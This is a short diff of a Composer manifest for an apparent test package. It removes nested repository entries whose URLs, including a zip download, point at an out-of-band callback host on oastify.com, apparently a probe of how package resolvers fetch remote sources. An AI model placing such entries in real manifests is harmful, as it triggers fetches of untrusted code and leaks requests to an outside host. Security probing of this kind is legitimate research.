@@ -1,9 +1,4 @@
 {
   "name": "hardik0013/pk-tp-test",
-  "description": "Test package",
-  "repositories": [
-    { "type": "composer", "url": "https://nestedcomposer.uommm3do604r1eua5ggepugssjyam2ar.oastify.com/" },
-    { "type": "vcs", "url": "https://nestedvcs.uommm3do604r1eua5ggepugssjyam2ar.oastify.com/x.git" },
-    { "type": "package", "package": { "name": "x/y", "version": "1.0.0", "dist": { "type": "zip", "url": "https://nesteddist.uommm3do604r1eua5ggepugssjyam2ar.oastify.com/x.zip" } } }
-  ]
+  "description": "Test package"
 }
